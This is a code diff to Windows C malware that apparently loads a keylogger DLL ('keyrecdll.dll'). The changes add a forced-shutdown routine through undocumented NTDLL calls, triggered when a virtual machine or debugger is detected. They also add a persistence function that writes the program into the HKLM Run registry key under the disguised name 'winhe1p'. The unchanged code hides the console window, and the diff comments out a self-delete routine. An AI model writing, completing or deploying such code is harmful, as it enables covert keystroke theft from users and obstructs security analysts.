@@ -17,8 +17,11 @@
 */
 
 HANDLE hDesProcess = NULL;
+const unsigned long SE_SHUTDOWN_PRIVILEGE = 0x13;
+typedef int(_stdcall *_RtlAdjustPrivilege)(int, BOOL, BOOL, int *);
+typedef int(_stdcall *_ZwShutdownSystem)(int);
 
-bool AdjustProcessTokenPrivilege() {
+/* bool AdjustProcessTokenPrivilege() {
     LUID luidTmp;
     HANDLE hToken;
     TOKEN_PRIVILEGES tkp;
@@ -44,20 +47,34 @@ bool AdjustProcessTokenPrivilege() {
         return FALSE;
     }
     return true;
-}
+} */
 
-void delself(){
-    char Filename[256];
-    char Parameters[256];
+void shutdownimm(){
+    // char Filename[256];
+    // char Parameters[256];
 
-    GetModuleFileNameA(0, Filename, 256);
+    //我 删 我 自 己
+    /* GetModuleFileNameA(0, Filename, 256);
     GetShortPathNameA(Filename, Filename, 256);
     strcpy(Parameters, "/c del ");
     strcat(Parameters, Filename);
     strcat(Parameters, " >> NUL");
     printf("del?\n");
+    ShellExecuteA(0, 0, "cmd.exe", Parameters, 0, 0); */
+
     system("pause");
-    ShellExecuteA(0, 0, "cmd.exe", Parameters, 0, 0);
+    //提权
+    HMODULE hNtDll = LoadLibrary("NTDLL.dll");
+    if (!hNtDll){
+        printf("fail to load NTDLL.dll\n");
+        exit(1);
+    }
+    _RtlAdjustPrivilege pfnRtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
+    int nEn;
+    pfnRtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &nEn);
+    //强制关机
+    _ZwShutdownSystem pfnZwShutdownSystem = (_ZwShutdownSystem)GetProcAddress(hNtDll, "ZwShutdownSystem");
+    pfnZwShutdownSystem(0);
     exit(-1);
 }
 
@@ -217,25 +234,64 @@ bool DetectDebug(){
     return is_Debug;
 }
 
+int addreg(){
+    char Filepath[256];
+    char Syspath[256];
+    HKEY hkey = NULL;
+    DWORD ret;
+    GetModuleFileNameA(0, Filepath, 256);
+
+
+
+    ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //创建一个注册表项，如果有则打开该注册表项
+                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                        0,
+                        NULL,
+                        REG_OPTION_NON_VOLATILE,
+                        KEY_ALL_ACCESS,    //部分windows系统编译该行会报错， 删掉 “”KEY_WOW64_64KEY | “” 即可
+                        NULL,
+                        &hkey,
+                        NULL);
+    if (ret != ERROR_SUCCESS) {
+        printf("open reg fail\n");
+        return 0;
+    }
+
+    ret = RegSetValueEx(hkey,
+                        "winhe1p",
+                        0,
+                        REG_SZ,
+                        (const BYTE *)Filepath,
+                        strlen(Filepath));
+    if (ret != ERROR_SUCCESS) {
+        printf("set reg failed\n");
+        return 0;
+    }
+
+    RegCloseKey(hkey);
+
+    return 1;
+}
+
 int main(int argc, char *argv[]){
     printf("Start\n");
     //虚拟机检测
     if(DetectVM() == true){
         printf("running in VM, exiting\n");
-        delself();
+        shutdownimm();
     }
 
     //调试过程检测
     if(DetectDebug() == true){
         printf("running under debug mode\n");
-        delself();
+        shutdownimm();
     }
     
     //隐藏cmd窗口
     ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);
 
-    //提权
-    //AdjustProcessTokenPrivilege();
+    //添加注册表达到开机自启动
+    addreg();
 
     //读取DLL及其中的函数
     HMODULE hMod = LoadLibraryA("keyrecdll.dll");
